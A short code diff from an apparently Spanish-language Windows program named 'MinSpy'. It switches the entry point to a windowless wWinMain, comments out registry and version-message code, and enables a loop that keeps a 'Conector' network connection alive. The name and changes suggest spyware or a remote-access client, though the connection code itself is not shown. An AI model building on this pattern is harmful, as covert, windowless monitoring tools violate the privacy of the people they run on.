@@ -12,9 +12,10 @@
 * @fn main
 * @brief Punto de entrada del programa
 */
-//int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR    lpCmdLine, int nCmdShow)
-int main()
+int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR    lpCmdLine, int nCmdShow)
+//int main()
 {
+	/*
 	RegData regData;
 	WinReg winreg;
 	DWORD  osInstallDate = 0;;
@@ -56,16 +57,15 @@ int main()
 	wsprintfW(SpyversionW, L"%i", Spyversion);
 	MessageBoxW(NULL, SpyversionW, L"MinSpy version actualizada", MB_OK);
 
-
-	/*
-	// Conectar...
-	Conector cn;
-	// Mientras la conexi�n siga vigent	while (cn.Listo())
-	{
-	Sleep(1000);
-	}
-
 	*/
 	
+
+	// Conectar...
+	Conector cn;
+	// Mientras la conexion siga vigente	
+	while (cn.Listo())
+	{
+		Sleep(1000);
+	}
 	return 0;
 }
